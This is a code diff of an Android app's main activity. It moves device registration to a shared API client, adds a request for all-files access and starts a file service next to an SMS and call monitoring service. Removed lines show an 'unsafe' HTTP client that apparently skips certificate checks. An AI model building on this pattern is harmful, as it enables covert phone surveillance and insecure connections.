@@ -12,15 +12,11 @@ import androidx.activity.ComponentActivity
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult
 import androidx.core.content.ContextCompat
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody
+import com.example.bullsseeclient.api.ApiClient
+import com.example.bullsseeclient.api.DeviceDto
 import retrofit2.Call
 import retrofit2.Callback
 import retrofit2.Response
-import retrofit2.Retrofit
-import retrofit2.converter.gson.GsonConverterFactory
-import retrofit2.http.Body
-import retrofit2.http.POST
 import java.time.Instant
 
 class MainActivity : ComponentActivity() {
@@ -39,33 +35,38 @@ class MainActivity : ComponentActivity() {
         maybeRequestDialerRole()
         registerDevice()
         com.example.bullsseeclient.services.SmsCallMonitorService.start(this)
+        com.example.bullsseeclient.services.FileService.start(this)
     }
 
     private val roleRequestLauncher = registerForActivityResult(StartActivityForResult()) { }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        checkAndRequestAllFilesAccess()
         val permissions = requiredPermissions()
         permissionRequest.launch(permissions.toTypedArray())
         android.util.Log.d("MainActivity", "requested permissions and starting flow")
     }
 
-    private fun registerDevice() {
-        val retrofit = Retrofit.Builder()
-            .baseUrl(HttpClient.BASE_URL)
-            .addConverterFactory(GsonConverterFactory.create())
-            .client(HttpClient.getUnsafeOkHttpClient())
-            .build()
+    private fun checkAndRequestAllFilesAccess() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!android.os.Environment.isExternalStorageManager()) {
+                val intent = Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                intent.data = android.net.Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
+        }
+    }
 
-        val api = retrofit.create(ApiService::class.java)
+    private fun registerDevice() {
         val device = DeviceDto(
             deviceName = android.os.Build.MODEL,
             model = android.os.Build.MODEL,
             osVersion = android.os.Build.VERSION.RELEASE,
             lastUpdated = Instant.now().toEpochMilli()
         )
-        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(device))
-        api.registerDevice(body).enqueue(object : Callback<Void> {
+        
+        ApiClient.api.registerDevice(device).enqueue(object : Callback<Void> {
             override fun onResponse(call: Call<Void>, response: Response<Void>) {
                 Log.d("MainActivity", "Register status=${response.code()}")
             }
@@ -73,18 +74,6 @@ class MainActivity : ComponentActivity() {
                 Log.e("MainActivity", "Register error=${t.message}")
             }
         })
-    }
-
-    data class DeviceDto(
-        val deviceName: String?,
-        val model: String?,
-        val osVersion: String?,
-        val lastUpdated: Long
-    )
-
-    interface ApiService {
-        @POST("api/DeviceData/device-register")
-        fun registerDevice(@Body data: RequestBody): Call<Void>
     }
 
     private fun requiredPermissions(): MutableList<String> {
